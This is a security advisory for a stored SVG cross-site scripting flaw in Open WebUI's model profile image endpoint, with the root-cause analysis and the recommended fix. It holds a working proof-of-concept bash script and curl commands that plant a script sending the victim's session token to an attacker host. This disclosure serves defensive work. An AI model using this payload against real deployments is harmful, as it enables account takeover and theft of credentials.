# [H] Open WebUI: Stored XSS to Account Takeover via Model Profile Images 

## Summary
Severity: High
Advisory: GHSA-v2qm-5wxj-qhj7
CVE: CVE-2026-54013
CWE: CWE-116, CWE-693, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-v2qm-5wxj-qhj7
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
# Stored XSS to Account Takeover via Model Profile Images in Open WebUI

**Affected:** Open WebUI <= 0.9.5
**Bypass of:** GHSA-3wgj-c2hg-vm6q, GHSA-3856-3vxq-m6fc

---

## TL;DR

Open WebUI patched SVG XSS in user profile images and webhook profile images  but forgot to apply the same fix to **model** profile images. The `ModelMeta` class has no `validate_profile_image_url` field validator, and the model image serving endpoint has no MIME allowlist or `nosniff` header. Any authenticated user with `workspace.models` permission (enabled by default) can store a `data:image/svg+xml;base64,...` payload in a model's profile image and achieve full account takeover of anyone who navigates to the image URL.

---

## Past of the issue

In early 2025, two security advisories landed for Open WebUI:

- **GHSA-3wgj-c2hg-vm6q**  SVG XSS via user profile images
- **GHSA-3856-3vxq-m6fc**  SVG XSS via webhook profile images

The patches were clean. A `validate_profile_image_url` function was introduced in `backend/open_webui/utils/validate.py`  a compiled regex that restricts `data:` URIs to safe raster formats (`image/png`, `image/jpeg`, `image/gif`, `image/webp`), explicitly excluding `image/svg+xml` because SVG can carry embedded `<script>` tags. On the output side, `users.py` added a MIME allowlist check and `X-Content-Type-Options: nosniff`.

The fix was applied to `UserUpdateForm`, `UpdateProfileForm`, and later to `ChannelWebhookForm`. Three models patched. Case closed.

Except there was a fourth endpoint.

## The Gap

Open WebUI has a concept of "Models"  user-created model configurations with metadata including a profile image. The metadata lives in `ModelMeta`:

```python
# backend/open_webui/models/models.py, line 37-47
class ModelMeta(BaseModel):
    profile_image_url: Optional[str] = '/static/favicon.png'
    description: Optional[str] = None
    capabilities: Optional[dict] = None
    model_config = ConfigDict(extra='allow')
```

No `@field_validator`. No import of `validate_profile_image_url`. `ModelMeta` accepts any string as `profile_image_url`  including `data:image/svg+xml;base64,...`.

The serving endpoint at `GET /api/v1/models/model/profile/image` has the same gap:

```python
# backend/open_webui/routers/models.py, line 503-518
elif profile_image_url.startswith('data:image'):
    header, base64_data = profile_image_url.split(',', 1)
    image_data = base64.b64decode(base64_data)
    image_buffer = io.BytesIO(image_data)
    media_type = header.split(';')[0].lstrip('data:')

    headers = {'Content-Disposition': 'inline'}
    # ...
    return StreamingResponse(
        image_buffer,
        media_type=media_type,
        headers=headers,
    )
```

No MIME allowlist. No `nosniff`. No CSP. The SVG is served inline with `Content-Type: image/svg+xml` on the application's origin.

Compare this with the **patched** user endpoint:

```python
# backend/open_webui/routers/users.py, line 497-509
media_type = header.split(';')[0].lstrip('data:').lower()

if media_type not in PROFILE_IMAGE_ALLOWED_MIME_TYPES:   # <-- ABSENT in models.py
    return FileResponse(f'{STATIC_DIR}/user.png')

return StreamingResponse(
    image_buffer,
    media_type=media_type,
    headers={
        'Content-Disposition': 'inline',
        'X-Content-Type-Options': 'nosniff',             # <-- ABSENT in models.py
    },
)
```

The fix exists. It just was never applied here.

## Comparison Table

| Endpoint | Input Validation | MIME Allowlist | nosniff | Status |
|----------|:---:|:---:|:---:|--------|
| `GET /users/{id}/profile/image` | YES | YES | YES | **Patched** |
| `GET /webhooks/{id}/profile/image` | YES | no | no | Partially patched |
| `GET /models/model/profile/image` | **NO** | **NO** | **NO** | **Vulnerable** |

## Three Write Vectors

The malicious SVG data URI can be injected through any of three endpoints  all pass `ModelForm` containing `ModelMeta` without validation:

1. **`POST /api/v1/models/create`** (line 195)  any user with `workspace.models` permission
2. **`POST /api/v1/models/update`** (line 581)  model owner or admin
3. **`POST /api/v1/models/import`** (line 279)  admin only

The `workspace.models` permission is **enabled by default** for all non-pending users in a standard deployment.

## The Attack

**Step 1  Store the payload:**

```bash
SVG=$(echo '<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    new Image().src="https://attacker.example.com/steal?t="+localStorage.getItem("token")
  </script>
</svg>' | base64 -w0)

curl -s -X POST 'https://TARGET/api/v1/models/create' \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{
    \"id\": \"gpt-4-turbo-preview\",
    \"name\": \"GPT-4 Turbo\",
    \"base_model_id\": \"gpt-4\",
    \"meta\": {
      \"profile_image_url\": \"data:image/svg+xml;base64,$SVG\",
      \"description\": \"Latest GPT-4 Turbo model\"
    },
    \"params\": {},
    \"access_grants\": []
  }"
```

**Step 2  Victim navigates to the image URL:**

```
https://TARGET/api/v1/models/model/profile/image?id=gpt-4-turbo-preview
```

This happens naturally when a user right-clicks a model's avatar and selects "Open Image in New Tab", or when the attacker sends the URL directly (e.g., in a channel message).

**Step 3  Token theft:**

The server responds:

```http
HTTP/1.1 200 OK
content-type: image/svg+xml
content-disposition: inline

<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    new Image().src="https://attacker.example.com/steal?t="+localStorage.getItem("token")
  </script>
</svg>
```

No `X-Content-Type-Options`. No `Content-Security-Policy`. The browser renders the SVG as a top-level document in the Open WebUI origin. The embedded `<script>` executes. `localStorage.getItem("token")` returns the victim's JWT. The attacker receives it and has full API access  password changes, admin promotion, data exfiltration.

## PoC

```bash
#!/usr/bin/env bash
# PoC: Stored SVG XSS -> token theft via Open WebUI model profile image
# Affected: open-webui <= 0.9.5

TARGET="http://localhost:8080"
ATTACKER_TOKEN="<attacker_JWT_from_localStorage.token>"
COLLECTOR="https://attacker.example.com/steal"   # attacker-controlled listener

# --- Step 1: Build the malicious SVG (steals victim JWT from localStorage) ---
read -r -d '' SVG <<EOF
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    new Image().src="${COLLECTOR}?t="+encodeURIComponent(localStorage.getItem("token"));
  </script>
</svg>
EOF
SVG_B64=$(printf '%s' "$SVG" | base64 -w0)

# --- Step 2: Store the payload in a model's profile_image_url ---
curl -s -X POST "${TARGET}/api/v1/models/create" \
  -H "Authorization: Bearer ${ATTACKER_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"id\": \"gpt-4-turbo-preview\",
    \"name\": \"GPT-4 Turbo\",
    \"base_model_id\": \"gpt-4\",
    \"meta\": {
      \"profile_image_url\": \"data:image/svg+xml;base64,${SVG_B64}\",
      \"description\": \"Latest GPT-4 Turbo\"
    },
    \"params\": {},
    \"access_grants\": []
  }"

# --- Step 3: Trigger (victim navigates here, or attacker sends the link) ---
echo "Victim opens:  ${TARGET}/api/v1/models/model/profile/image?id=gpt-4-turbo-preview"
```

Expected server response at Step 3 (the proof — SVG served inline, no defenses):

```
HTTP/1.1 200 OK
content-type: image/svg+xml
content-disposition: inline

<svg xmlns="http://www.w3.org/2000/svg">
  <script>new Image().src="https://attacker.example.com/steal?t="+localStorage.getItem("token")</script>
</svg>
````
No X-Content-Type-Options, no Content-Security-Policy. The browser renders the SVG as a top-level document, the <script> executes in the Open WebUI origin, and the victim's JWT lands in the attacker's collector log. The attacker replays the JWT against the API for full account takeover (password change, admin promotion).

Trigger note: because the frontend loads model avatars in `<img src=...>` context (where SVG scripts do not run), exploitation requires the victim to load the URL as a top-level document — e.g. right-click → "Open image in new tab", or clicking the raw link when the attacker pastes it into a channel/chat. That single click is the only user interaction needed.

## Root Cause

An incomplete patch. When GHSA-3wgj-c2hg-vm6q was fixed, the validator was added to `UserUpdateForm` and `UpdateProfileForm`. When GHSA-3856-3vxq-m6fc was fixed, it was added to `ChannelWebhookForm`. But `ModelMeta`  which uses the same `profile_image_url` field with the same serving logic  was never touched. The output-side defenses (MIME allowlist + `nosniff`) were also only added to `users.py`, not to `models.py` or `channels.py`.

## Recommended Fix

**Input side**  add the validator to `ModelMeta`:

```python
# backend/open_webui/models/models.py
from open_webui.utils.validate import validate_profile_image_url

class ModelMeta(BaseModel):
    profile_image_url: Optional[str] = '/static/favicon.png'
    # ...

    @field_validator('profile_image_url', mode='before')
    @classmethod
    def check_profile_image_url(cls, v):
        if v is None:
            return v
        return validate_profile_image_url(v)
```

**Output side**  add MIME check and nosniff to the serving endpoint:

```python
# backend/open_webui/routers/models.py
media_type = header.split(';')[0].lstrip('data:').lower()

if media_type not in PROFILE_IMAGE_ALLOWED_MIME_TYPES:
    return FileResponse(f'{STATIC_DIR}/favicon.png')

return StreamingResponse(
    image_buffer,
    media_type=media_type,
    headers={
        'Content-Disposition': 'inline',
        'X-Content-Type-Options': 'nosniff',
    },
)
```

Both layers are necessary  input validation prevents storage, output validation prevents serving even if a bypass is found later.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-v2qm-5wxj-qhj7
- https://nvd.nist.gov/vuln/detail/CVE-2026-54013
- https://github.com/advisories/GHSA-v2qm-5wxj-qhj7
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2757.yaml
- https://pypi.org/project/open-webui
